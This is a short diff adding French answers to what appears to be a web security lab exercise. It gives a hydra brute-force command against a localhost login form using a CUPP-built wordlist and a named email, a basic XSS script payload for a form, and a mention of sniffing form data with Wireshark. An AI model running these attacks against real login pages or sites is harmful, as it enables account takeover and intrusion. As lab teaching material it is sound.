@@ -1,0 +1,8 @@
+1 : Voir mark.txt dans le dossier cupp.
+
+2 : ./hydra  -l mark.martin@gmail.com -P ../mark.txt -v -V localhost:8092 http-post-form "/checkCredentials.php:username=^USER^&password=^PASS^:login failed"
+
+Exo 2 :
+
+1ere façon : <script>alert(‘document.cookie’)</script>. attaque xss dans le formulaire.
+2eme : Avec wireshark pour regarder les données envoyées lors de l'envoie du form.
